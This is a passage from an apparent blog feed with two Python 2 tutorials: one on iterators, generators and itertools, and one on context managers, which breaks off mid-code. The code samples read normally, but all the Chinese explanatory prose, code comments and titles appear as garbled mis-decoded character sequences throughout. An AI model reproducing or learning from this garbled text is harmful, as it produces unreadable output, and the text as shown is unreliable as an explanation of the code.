    <content type="html"><![CDATA[<p>æ˜¨æ™šç”¨pythonå†™äº†ä¸ªç®€å•çš„é“¾è¡¨ï¼Œçªç„¶æƒ³èµ·äº†è¿­ä»£å™¨ï¼Œå°±éšæ‰‹æ•´ç†ä¸€ä¸‹ï¼Œé¡ºä¾¿è¿‡ä¸€ä¸‹itertoolsæ¨¡å—ã€‚</p>
<a id="more"></a>
<h1 id="1">1. ç®€ä»‹</h1>
<p>è¿­ä»£å™¨(iterator)æ˜¯Pythonä¸­ä¸€ç§ç”¨æ¥è¿›è¡Œæƒ°æ€§è¿­ä»£çš„æ•°æ®ç±»å‹ï¼Œè¿­ä»£å™¨å¯ä»¥æƒ°æ€§åœ°åœ¨éœ€è¦æ—¶ç”Ÿæˆæ•°æ®å¹¶è¿”å›å·²è¿›è¡Œè¿­ä»£ï¼Œè€Œä¸éœ€è¦åœ¨å¼€å§‹è¿›è¡Œæ—¶ç”Ÿæˆæ‰€æœ‰æ•°æ®ï¼ˆæœ‰çš„æ—¶å€™ä¹Ÿä¸å¯èƒ½ç”Ÿæˆæ‰€æœ‰æ•°æ®ï¼Œæ¯”å¦‚æ–æ³¢é‚£å¥‘æ•°åˆ—çš„æ— ç©·è¿­ä»£ç­‰ï¼‰ç„¶åä¸€ä¸ªä¸€ä¸ªè¿”å›ã€‚</p>
<h1 id="2">2. ç”¨æ³•</h1>
<h2 id="21-iter">2.1 æœ€åŸºç¡€çš„ä¾‹å­: iter()å‡½æ•°ç”Ÿæˆè¿­ä»£å™¨</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">list_ = [<span class="number">1</span>,<span class="number">2</span>]</div><div class="line">it = iter(list_)                        <span class="comment"># è¿”å›ä¸€ä¸ªè¿­ä»£å™¨</span></div><div class="line"></div><div class="line">it.next()                               <span class="comment"># è·å–ä¸€ä¸ªè¿­ä»£å™¨å…ƒç´ ï¼Œè¿”å›1</span></div><div class="line">next(it)                                <span class="comment"># ä½¿ç”¨nextå†…å»ºå‡½æ•°ï¼Œç­‰åŒäºit.next(), è¿”å›2</span></div><div class="line">it.next()                               <span class="comment"># è¿­ä»£ç»“æŸï¼Œè§¦å‘StopIterationå¼‚å¸¸</span></div><div class="line"></div><div class="line">list_ = [<span class="number">1</span>,<span class="number">2</span>]</div><div class="line">it = iter(list_)</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> it:                            <span class="comment"># ç”¨forå¾ªç¯å¯¹è¿­ä»£å™¨è¿›è¡Œå¾ªç¯è¿­ä»£</span></div><div class="line">    <span class="keyword">print</span> x                             <span class="comment"># è¿­ä»£ç»“æŸæ—¶ï¼ŒStopIterationä¸ä¼šè¢«è§¦å‘</span></div></pre></td></tr></table></figure>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿­ä»£å™¨åªå¯å‘å‰è¿­ä»£ï¼Œä¸èƒ½å‘åè¿­ä»£ï¼Œè·å–ä¹‹å‰å·²è¿”å›è¿‡çš„å€¼ï¼ˆå½“ç„¶ç»å¤§å¤šæ•°çš„æ—¶å€™ä¹Ÿæ²¡å¿…è¦å‘åè¿­ä»£ï¼‰ã€‚</p>
<h2 id="22">2.2 ç”Ÿæˆå™¨</h2>
<p><code>[x*2 for x in range(10) if x%2==0]</code>, è¿™æ®µä»£ç ä¸ºåˆ—è¡¨ç”Ÿæˆå¼ï¼ˆä¹Ÿç§°ä½œåˆ—è¡¨è§£æï¼‰ï¼Œå¯ä»¥å°†ä¸€ä¸ªåˆ—è¡¨è¿›è¡Œè½¬åŒ–ï¼›å°†æ–¹æ‹¬å·å˜ä¸ºåœ†æ‹¬å·ï¼Œ<code>(x*2 for x in range(10) if x%2==0)</code>, åˆ™è¯¥ä»£ç å˜ä¸ºä¸€ä¸ªç”Ÿæˆå™¨(generator)ã€‚
ç”Ÿæˆå™¨å¯ä»¥åƒè¿­ä»£å™¨ä¸€æ ·è¿›è¡Œè¿­ä»£ï¼Œè¿˜å¯ä»¥é€šè¿‡ç”Ÿæˆå™¨çš„æˆå‘˜å‡½æ•°å’Œç”Ÿæˆå™¨å†…éƒ¨çš„ä»£ç è¿›è¡Œæ•°æ®äº¤æ¢ã€‚</p>
<h1 id="3">3. è‡ªå®šä¹‰è¿­ä»£å™¨åŠç”Ÿæˆå™¨</h1>
<h2 id="31">3.1 è‡ªå®šä¹‰è¿­ä»£å™¨</h2>
<p>åœ¨ç¼–å†™ç±»çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡å®šä¹‰ç±»çš„<code>__iter__</code>å‡½æ•°æ¥ä½¿ç±»å¯ä»¥è½¬åŒ–ä¸ºè¿­ä»£å™¨ã€‚åœ¨<code>__iter__</code>å‡½æ•°ç»“æŸæ—¶ï¼Œä¼šè‡ªåŠ¨å¼•å‘<code>StopIteration</code>å¼‚å¸¸ã€‚ä¾‹:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Counter</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.number = <span class="number">0</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            <span class="keyword">yield</span> self.number</div><div class="line">            self.number += <span class="number">1</span></div><div class="line"></div><div class="line">a = Counter()</div><div class="line">it = iter(a)</div><div class="line"><span class="keyword">print</span> it.next()                 <span class="comment"># 0</span></div><div class="line"><span class="keyword">print</span> it.next()                 <span class="comment"># 1</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> num <span class="keyword">in</span> it:</div><div class="line">    <span class="keyword">print</span> num                   <span class="comment"># å› ä¸ºè¯¥è¿­ä»£å™¨ä¸ºæ— ç©·è¿­ä»£ï¼Œæ‰€ä»¥ä¼šå¯¼è‡´æ­»å¾ªç¯</span></div></pre></td></tr></table></figure>
<h2 id="32">3.2 è‡ªå®šä¹‰ç”Ÿæˆå™¨</h2>
<p>å¯ä»¥ç”¨å‡½æ•°è‡ªå®šä¹‰ç”Ÿæˆå™¨ã€‚ä¾‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">()</span>:</span></div><div class="line">    a, b = <span class="number">1</span>, <span class="number">1</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        <span class="keyword">yield</span> a                 <span class="comment"># ç”¨yieldå‡½æ•°æ¥åœ¨è¿­ä»£æ—¶è¿”å›å€¼ï¼Œåœ¨ä¸‹æ¬¡è¿­ä»£æ—¶ï¼Œè‡ªåŠ¨ä»yieldè¯­å¥çš„ä¸‹ä¸€æ¡è¯­å¥å¼€å§‹æ‰§è¡Œ</span></div><div class="line">        a, b = b, a+b</div><div class="line"></div><div class="line">k = fib()</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">    <span class="keyword">print</span> next(k)               <span class="comment"># 1 1 2 3 5 8 13 21 34 55</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> type(k)                   <span class="comment"># &lt;generator object fib at 0x0268BDF0&gt;</span></div></pre></td></tr></table></figure>
<h2 id="33">3.3 ç”Ÿæˆå™¨çš„è¿›é˜¶ç”¨æ³•</h2>
<p><code>generator.next()</code>ç”¨æ¥è¿›è¡Œè¿­ä»£å¹¶è·å–è¿”å›å€¼ï¼›<code>generator.close()</code>ç”¨æ¥å…³é—­ç”Ÿæˆå™¨ï¼Œå¹¶åœ¨ä¸‹æ¬¡è¿­ä»£æ—¶å‡ºå‘StopIterationå¼‚å¸¸ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">a = fib()</div><div class="line"><span class="keyword">print</span> next(a)                   <span class="comment"># 1</span></div><div class="line">a.close()                       <span class="comment"># å…³é—­è¿­ä»£å™¨</span></div><div class="line"><span class="keyword">print</span> next(a)                   <span class="comment"># StopIteration</span></div></pre></td></tr></table></figure>
<p><code>generator.send(arg)</code>å¯ä»¥å‘ç”Ÿæˆå™¨å†…éƒ¨ä¼ é€’å¯¹è±¡ï¼Œ<code>generator.throw(typ[,val[,tb]])</code>å¯ä»¥å‘ç”Ÿæˆå™¨å†…éƒ¨ä¼ é€’å¼‚å¸¸ï¼ˆåŒ…æ‹¬ç±»å‹ï¼Œå…·ä½“å¼‚å¸¸å¯¹è±¡å’ŒTracebackï¼‰ï¼›åœ¨è°ƒç”¨è¿™ä¸¤ä¸ªå‡½æ•°åï¼Œç”Ÿæˆå™¨ç«‹åˆ»è¿›è¡Œè¿­ä»£å¹¶è¿”å›å€¼ï¼ˆæˆ–è§¦å‘StopIterationï¼‰ã€‚å…·ä½“æ“ä½œï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">counter</span><span class="params">()</span>:</span></div><div class="line">    num = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            ret = <span class="keyword">yield</span> num</div><div class="line">        <span class="keyword">except</span> ValueError:</div><div class="line">            <span class="keyword">print</span> <span class="string">"ValueError caught"</span></div><div class="line"></div><div class="line">        <span class="keyword">if</span> ret <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">            num = ret</div><div class="line">        num += <span class="number">1</span></div><div class="line"></div><div class="line">c = counter()</div><div class="line"><span class="keyword">print</span> c.next()                          <span class="comment"># 0</span></div><div class="line"><span class="keyword">print</span> c.send(<span class="number">3</span>)                         <span class="comment"># ä¼ è¾“3ï¼Œå†…éƒ¨yieldè¯­å¥è¿”å›3ï¼Œç„¶åè¿›è¡Œä¸‹æ¬¡è¿­ä»£ï¼Œç”Ÿæˆ4</span></div><div class="line"><span class="keyword">print</span> c.next()                          <span class="comment"># 5</span></div><div class="line">c.throw(ValueError)                     <span class="comment"># ä¼ é€’å¼‚å¸¸ï¼Œå†…éƒ¨yieldå‡½æ•°è§¦å‘å¼‚å¸¸ï¼Œç„¶åè¿›è¡Œå¼‚å¸¸å¤„ç†ï¼Œè¾“å‡º"ValueError caught"ï¼Œè‹¥æœªå¤„ç†ï¼Œåˆ™å¼‚å¸¸ä¼šå‘ä¸Šå±‚æŠ›å‡º</span></div><div class="line"><span class="keyword">print</span> c.next()                          <span class="comment"># 6</span></div></pre></td></tr></table></figure>
<h1 id="4-itertools">4. itertoolsæ¨¡å—</h1>
<p>itertoolsæ˜¯Pythonè‡ªå¸¦çš„ä¸€ä¸ªæ¨¡å—ï¼ŒåŒ…å«å¾ˆå¤šä½¿ç”¨å‡½æ•°ï¼Œç”¨æ¥å¯¹ä¸€ä¸ªæˆ–å¤šä¸ªå¯è¿­ä»£å¯¹è±¡è¿›è¡Œæ“ä½œåè¿”å›ä¸€ä¸ªè¿­ä»£å™¨ã€‚å…·ä½“å‡½æ•°åˆ—è¡¨ï¼š</p>
<ol>
<li>
<p>æ— é™è¿­ä»£å™¨</p>
<ul>
<li><code>count(start, [step])</code>
ä»startå¼€å§‹ï¼Œä»¥åæ¯ä¸ªå…ƒç´ éƒ½åŠ ä¸Šstepã€‚stepé»˜è®¤å€¼ä¸º1ã€‚
<code>count(5)</code> -&gt; 5 6 7 â€¦</li>
<li><code>cycle(p)</code>
è¿­ä»£è‡³pçš„æœ€åä¸€ä¸ªå…ƒç´ ä¹‹åï¼Œä»pçš„ç¬¬ä¸€ä¸ªå…ƒç´ é‡æ–°è¿­ä»£ã€‚
<code>cycle('abc')</code> -&gt; a b c a b c â€¦</li>
<li><code>repeat(elem [,n])</code>
æ— é™é‡å¤æˆ–é‡å¤næ¬¡è¿”å›elemã€‚
<code>repeat(&quot;Ah&quot;, 3)</code> -&gt; â€œAhâ€ â€œAhâ€ â€œAhâ€</li>
</ul>
</li>
<li>
<p>åœ¨æœ€çŸ­çš„åºåˆ—ç»“æŸè¿­ä»£æ—¶åœæ­¢è¿­ä»£</p>
<ul>
<li>chain(p, q, â€¦)
è¿­ä»£è‡³åºåˆ—pçš„æœ€åä¸€ä¸ªå…ƒç´ åï¼Œä»qçš„ç¬¬ä¸€ä¸ªå…ƒç´ å¼€å§‹ï¼Œç›´åˆ°æ‰€æœ‰åºåˆ—ç»ˆæ­¢ã€‚
<code>chain(&quot;ABC&quot;, &quot;DEF&quot;)</code> -&gt; A B C D E F</li>
<li><code>compress(data, selectors)</code>
å¦‚æœbool(selectors[n])ä¸ºTrueï¼Œåˆ™next()è¿”å›data[n]ï¼Œå¦åˆ™è·³è¿‡data[n]ã€‚
<code>compress('ABCDEF', [1,0,1,0,1,1])</code> -&gt; A C E F</li>
<li><code>dropwhile(pred, seq)</code>
å½“predå¯¹seq[n]çš„è°ƒç”¨è¿”å›Falseæ—¶æ‰å¼€å§‹è¿­ä»£ã€‚
<code>dropwhile(lambda x: x&lt;5, [1,4,6,4,1])</code> -&gt; 6 4 1</li>
<li><code>takewhile(pred, seq)</code>
dropwhileçš„ç›¸åç‰ˆæœ¬ã€‚
<code>takewhile(lambda x: x&lt;5, [1,4,6,4,1])</code> -&gt; 1 4</li>
<li><code>ifilter(pred, seq)</code>
å†…å»ºå‡½æ•°filterçš„è¿­ä»£å™¨ç‰ˆæœ¬ã€‚
<code>ifilter(lambda x: x%2, range(10))</code> -&gt; 1 3 5 7 9</li>
<li><code>ifilterfalse(pred, seq)</code>
ifilterçš„ç›¸åç‰ˆæœ¬ã€‚
<code>ifilterfalse(lambda x: x%2, range(10))</code> -&gt; 0 2 4 6 8</li>
<li><code>imap(func, p, q, ...)</code>
å†…å»ºå‡½æ•°mapçš„è¿­ä»£å™¨ç‰ˆæœ¬ã€‚
<code>imap(pow, (2,3,10), (5,2,3))</code> -&gt; 32 9 1000</li>
<li><code>starmap(func, seq)</code>
å°†seqçš„æ¯ä¸ªå…ƒç´ ä»¥å˜é•¿å‚æ•°(*args)çš„å½¢å¼è°ƒç”¨funcã€‚
<code>starmap(pow, [(2,5), (3,2), (10,3)])</code> -&gt; 32 9 1000</li>
<li><code>izip(p, q, ...)</code>
å†…å»ºå‡½æ•°zipçš„è¿­ä»£å™¨ç‰ˆæœ¬ã€‚
<code>izip('ABCD', 'xy')</code> -&gt; Ax By</li>
<li><code>izip_longest(p, q, ..., fillvalue=None)</code>
izipçš„å–æœ€é•¿åºåˆ—çš„ç‰ˆæœ¬ï¼ŒçŸ­åºåˆ—å°†å¡«å…¥fillvalueã€‚
<code>izip_longest('ABCD', 'xy', fillvalue='-')</code> -&gt; Ax By C- D-</li>
<li><code>tee(it, n)</code>
è¿”å›nä¸ªè¿­ä»£å™¨itçš„å¤åˆ¶è¿­ä»£å™¨ã€‚</li>
<li><code>groupby(iterable[, keyfunc])</code>
è¿™ä¸ªå‡½æ•°åŠŸèƒ½ç±»ä¼¼äºSQLçš„åˆ†ç»„ã€‚ä½¿ç”¨groupbyå‰ï¼Œé¦–å…ˆéœ€è¦ä½¿ç”¨ç›¸åŒçš„keyfuncå¯¹iterableè¿›è¡Œæ’åºï¼Œæ¯”å¦‚è°ƒç”¨å†…å»ºçš„sortedå‡½æ•°ã€‚ç„¶åï¼Œgroupbyè¿”å›è¿­ä»£å™¨ï¼Œæ¯æ¬¡è¿­ä»£çš„å…ƒç´ æ˜¯å…ƒç»„(keyå€¼, iterableä¸­å…·æœ‰ç›¸åŒkeyå€¼çš„å…ƒç´ çš„é›†åˆçš„å­è¿­ä»£å™¨)ã€‚æˆ–è®¸çœ‹çœ‹Pythonçš„æ’åºæŒ‡å—å¯¹ç†è§£è¿™ä¸ªå‡½æ•°æœ‰å¸®åŠ©ã€‚
<code>groupby([0, 0, 0, 1, 1, 1, 2, 2, 2])</code> -&gt; (0, (0 0 0)) (1, (1 1 1)) (2, (2 2 2))</li>
</ul>
</li>
<li>
<p>ç»„åˆè¿­ä»£å™¨</p>
<ul>
<li><code>product(p, q, ... [repeat=1])</code>
ç”Ÿæˆç¬›å¡å°”ç§¯ã€‚
<code>product('ABCD', repeat=2)</code> --&gt; AA AB AC AD BA BB BC BD CA CB CC CD DA DB DC DD</li>
<li><code>permutations(p[, r])</code>
ç”Ÿæˆå…¨æ’åˆ—ã€‚
<code>permutations('ABCD', 2)</code> --&gt; AB AC AD BA BC BD CA CB CD DA DB DC</li>
<li><code>combinations(p, r)</code>
ç”Ÿæˆç»„åˆã€‚
<code>combinations('ABCD', 2)</code> --&gt; AB AC AD BC BD CD</li>
<li><code>combinations_with_replacement()</code>
ç”Ÿæˆæ’åˆ—å…ƒç´ (p, q), ä¸”p&lt;q.
<code>combinations_with_replacement('ABCD', 2)</code> --&gt; AA AB AC AD BB BC BD CC CD DD</li>
</ul>
</li>
</ol>
<p>éƒ¨åˆ†æ–‡å­—æ¥æºï¼š<a href="http://www.cnblogs.com/huxi/archive/2011/07/01/2095931.html" target="_blank" rel="external">http://www.cnblogs.com/huxi/archive/2011/07/01/2095931.html</a></p>
<h1 id="5">5. å‚è€ƒæ–‡æ¡£</h1>
<ol>
<li><a href="https://docs.python.org/2.7/library/itertools.html#module-itertools" target="_blank" rel="external">itertools - Python Doc</a></li>
<li><a href="http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/00138681965108490cb4c13182e472f8d87830f13be6e88000" target="_blank" rel="external">ç”Ÿæˆå™¨ - å»–é›ªå³°çš„Pythonæ•™ç¨‹</a></li>
<li><a href="http://blog.csdn.net/bluebird_237/article/details/38894617" target="_blank" rel="external">Python è¿­ä»£å™¨ &amp; __iter__æ–¹æ³•</a></li>
<li><a href="http://www.cnblogs.com/huxi/archive/2011/07/01/2095931.html" target="_blank" rel="external">Pythonå‡½æ•°å¼ç¼–ç¨‹æŒ‡å—ï¼ˆä¸‰ï¼‰ï¼šè¿­ä»£å™¨</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ˜¨æ™šç”¨pythonå†™äº†ä¸ªç®€å•çš„é“¾è¡¨ï¼Œçªç„¶æƒ³èµ·äº†è¿­ä»£å™¨ï¼Œå°±éšæ‰‹æ•´ç†ä¸€ä¸‹ï¼Œé¡ºä¾¿è¿‡ä¸€ä¸‹itertoolsæ¨¡å—ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="//blog.stdioa.com/categories/Python/"/>
    
    
      <category term="python" scheme="//blog.stdioa.com/tags/python/"/>
    
      <category term="è¿­ä»£å™¨" scheme="//blog.stdioa.com/tags/%E8%BF%AD%E4%BB%A3%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>Pythonå­¦ä¹ ä¹‹ä¸Šä¸‹æ–‡ç®¡ç†</title>
    <link href="//blog.stdioa.com/2015/10/learning-python-context-management/"/>
    <id>//blog.stdioa.com/2015/10/learning-python-context-management/</id>
    <published>2015-10-22T12:00:00.000Z</published>
    <updated>2016-11-08T13:48:35.523Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘çªå‘å¥‡æƒ³ï¼Œæƒ³å†™ä¸€ä¸ªèƒ½æ”¹å˜å½“å‰è¾“å‡ºç¯å¢ƒï¼Œè¾“å‡ºå½©è‰²æ–‡å­—çš„ä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼Œäºæ˜¯å­¦ä¹ äº†ä¸€ä¸‹ä¸Šä¸‹æ–‡ç®¡ç†ã€‚</p>
<a id="more"></a>
<h1 id="1">1. ç®€ä»‹</h1>
<p>ä¸Šä¸‹æ–‡ç®¡ç†å™¨(context manager)æ˜¯Python2.5å¼€å§‹æ”¯æŒçš„ä¸€ç§è¯­æ³•ï¼Œç”¨äºè§„å®šæŸä¸ªå¯¹è±¡çš„ä½¿ç”¨èŒƒå›´ã€‚ä¸€æ—¦è¿›å…¥æˆ–è€…ç¦»å¼€è¯¥ä½¿ç”¨èŒƒå›´ï¼Œä¼šæœ‰ç‰¹æ®Šæ“ä½œè¢«è°ƒç”¨ (æ¯”å¦‚ä¸ºå¯¹è±¡åˆ†é…æˆ–è€…é‡Šæ”¾å†…å­˜)ã€‚ä¸€ä¸ªæœ€ç®€å•çš„ä¾‹å­:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">with</span> file(<span class="string">"a.txt"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</div><div class="line">    s = f.read()</div><div class="line">    <span class="keyword">print</span> f.closed                  <span class="comment"># æ­¤æ—¶æ–‡ä»¶æ˜¯æ‰“å¼€çš„</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> f.closed                      <span class="comment"># å˜é‡så’Œfä¾ç„¶å­˜åœ¨ï¼Œä½†æ­¤æ—¶få·²å…³é—­</span></div></pre></td></tr></table></figure>
<h1 id="2">2. ç¼–å†™ä¸Šä¸‹æ–‡ç®¡ç†å™¨</h1>
<p>ä¸ºä¸€ä¸ªç±»ç¼–å†™ä¸Šä¸‹æ–‡ç®¡ç†å™¨æ—¶ï¼Œéœ€è¦å®šä¹‰ç±»çš„<code>__enter__</code>å’Œ<code>__exit__</code>å‡½æ•°ã€‚</p>
<h2 id="21-enter-">2.1 __enter__å‡½æ•°</h2>
<p><code>__enter__</code>å‡½æ•°è§„å®šå¦‚ä¸‹ï¼š</p>
<blockquote>
<p>contextmanager.__enter__()
Enter the runtime context and return either this object or another object related to the runtime context. The value returned by this method is bound to the identifier in the as clause of with statements using this context manager.
è¿›å…¥å½“å‰ä¸Šä¸‹æ–‡ï¼Œå¹¶è¿”å›å½“å‰å¯¹è±¡æˆ–å¦ä¸€ä¸ªä¸å½“å‰ä¸Šä¸‹æ–‡ç›¸å…³çš„å¯¹è±¡ã€‚è¢«è¯¥å‡½æ•°è¿”å›çš„å˜é‡ä¼šé€šè¿‡è¯¥ä¸Šä¸‹æ–‡ç®¡ç†å™¨ä¸withæ–‡æ³•ä¸­asåçš„å£°æ˜æ‰€ç»‘å®šã€‚</p>
</blockquote>
<p>ä¾‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">BracketAdder</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__enter__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="comment"># do something with self and runtime context</span></div><div class="line">        sys.stdout.write(<span class="string">"("</span>)           <span class="comment"># è¾“å‡ºå·¦æ‹¬å·</span></div><div class="line">        <span class="keyword">return</span> self</div><div class="line"></div><div class="line">    <span class="comment"># __exit__å‡½æ•°ç•¥</span></div><div class="line"></div><div class="line"><span class="keyword">with</span> BracketAdder() <span class="keyword">as</span> ba:</div><div class="line">    <span class="comment"># do_something</span></div></pre></td></tr></table></figure>
<h2 id="22-exit-">2.2 __exit__å‡½æ•°</h2>
<p><code>__exit__</code>å‡½æ•°æ ¼å¼å¦‚ä¸‹:</p>
<blockquote>
<p>contexmanager.__exit__(exc_type, exc_val, exc_tb)</p>
</blockquote>
<p><em>æ–‡æ¡£å¤ªé•¿æ‡’å¾—ç¿»è¯‘äº†</em>_(:Ğ·ã‚âˆ )_</p>
<p>å¦‚æœä»£ç å—ä¸­å‡ºç°å¼‚å¸¸ï¼Œ<code>exc_type</code>ä¸ºå¼‚å¸¸ç±»å‹ï¼Œ<code>exc_val</code>ä¸ºè¯¥å¼‚å¸¸ï¼Œ<code>exc_tb</code>ä¸ºtraceback.<code>__exit__</code>å‡½æ•°åº”è¿”å›ä¸€ä¸ªboolç±»å‹ï¼Œè‹¥è¿”å›å€¼ä¸º<code>True</code>, åˆ™åœ¨ä»£ç å—åŠ<code>__exit__</code>å‡½æ•°è¿è¡Œç»“æŸåä¸ä¼šæŠ›å‡ºä»»ä½•å¼‚å¸¸ï¼Œç„¶åç«‹å³æ‰§è¡Œåé¢çš„ä»£ç ï¼›è‹¥è¿”å›å€¼ä¸º<code>False</code>ï¼Œåˆ™åœ¨<code>__exit__</code>å‡½æ•°è¿è¡Œç»“æŸåæŠ›å‡ºå¼‚å¸¸ã€‚<br>
è‹¥ä»£ç å—ä¸­æœªå‡ºç°å¼‚å¸¸ï¼Œåˆ™ä¸‰ä¸ªå˜é‡å‡ä¸º<code>None</code>.
ä¾‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">BracketAdder</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="comment"># __enter__å‡½æ•°ç•¥</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__exit__</span><span class="params">(self, exc_type, exc_val, exc_tb)</span>:</span></div><div class="line">        <span class="comment"># do something with self and runtime context</span></div><div class="line">        sys.stdout.write(<span class="string">')'</span>)</div><div class="line">        <span class="keyword">if</span> exc_type == NameError:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line"><span class="keyword">with</span> BracketAdder():</div><div class="line">    <span class="keyword">print</span> a                    <span class="comment"># è‹¥æ‰§è¡Œè¿™ä¸€æ¡å¼•å‘NameErrorå¼‚å¸¸ï¼Œåˆ™å¼‚å¸¸ä¸ä¼šè¢«æŠ›å‡º</span></div><div class="line">    a = <span class="number">1</span>/<span class="number">0</span>                    <span class="comment"># è‹¥æ‰§è¡Œè¿™ä¸€æ¡å¼•å‘ZeroDivisionError, åˆ™å¼‚å¸¸ä¼šè¢«æŠ›å‡º</span></div></pre></td></tr></table></figure>
<h1 id="3">3. ç»¼åˆç¤ºä¾‹</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding: utf-8</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">CManager</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.in_context = <span class="keyword">False</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__enter__</span><span class="params">(self)</span>:</span></div><div class="line">        self.in_context = <span class="keyword">True</span></div><div class="line">        <span class="keyword">print</span> <span class="string">"I'm entering the context"</span></div><div class="line">        <span class="keyword">return</span> self</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__exit__</span><span class="params">(self, exc_type, exc_val, exc_tb)</span>:</span></div><div class="line">        self.in_context = <span class="keyword">False</span></div><div class="line"></div><div class="line">        <span class="keyword">print</span> <span class="string">"I'm leaving the context"</span></div><div class="line">        </div><div class="line">        <span class="keyword">if</span> exc_type == NameError:       <span class="comment"># æ‹¦æˆªNameErrorå¼‚å¸¸</span></div><div class="line">            <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(self)</span>:</span></div><div class="line">        <span 